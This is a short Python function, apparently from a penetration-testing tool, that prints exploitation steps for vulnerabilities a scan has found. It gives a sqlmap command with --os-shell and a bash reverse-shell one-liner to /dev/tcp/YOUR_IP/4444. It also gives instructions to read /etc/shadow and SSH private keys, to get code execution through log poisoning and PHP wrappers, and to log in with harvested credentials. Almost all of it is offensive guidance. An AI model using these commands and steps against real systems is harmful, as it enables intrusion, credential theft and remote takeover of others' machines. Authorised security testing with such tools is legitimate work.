"""Generate exploitation guidance"""

def generate_exploitation_guide(vulnerabilities):
    """Generate exploitation guidance for found vulnerabilities"""
    print("\n" + "=" * 60)
    print("EXPLOITATION GUIDANCE")
    print("=" * 60 + "\n")
    
    for vuln in vulnerabilities:
        if vuln['severity'] not in ['CRITICAL', 'HIGH']:
            continue
        
        print(f"[{vuln['type']}]")
        print(f"  Target: {vuln['url']}")
        
        if vuln['type'] == 'SQL Injection':
            print("  Exploitation Steps:")
            print("    1. Use sqlmap for automated exploitation:")
            print(f"       sqlmap -u \"{vuln['url']}\" -p \"{vuln.get('parameter', 'id')}\" --dbs")
            print("    2. Enumerate databases and tables")
            print("    3. Extract sensitive data")
            print("    4. Attempt OS command execution with --os-shell")
        
        elif vuln['type'] == 'Remote Code Execution (RCE)':
            print("  Exploitation Steps:")
            print("    1. Verify RCE with safe commands (whoami, id)")
            print("    2. Establish reverse shell:")
            print("       bash -i >& /dev/tcp/YOUR_IP/4444 0>&1")
            print("    3. Upgrade to stable shell")
            print("    4. Begin post-exploitation")
        
        elif vuln['type'] == 'Local File Inclusion (LFI)':
            print("  Exploitation Steps:")
            print("    1. Read sensitive files (/etc/passwd, /etc/shadow)")
            print("    2. Look for SSH keys (~/.ssh/id_rsa)")
            print("    3. Read application configuration files")
            print("    4. Attempt log poisoning for RCE")
            print("    5. Try PHP filter wrappers for code execution")
        
        elif vuln['type'] == 'Weak Authentication':
            print("  Exploitation Steps:")
            print(f"    1. Login with: {vuln.get('username')}:{vuln.get('password')}")
            print("    2. Explore admin panel functionality")
            print("    3. Look for file upload features")
            print("    4. Search for privilege escalation paths")
        
        print()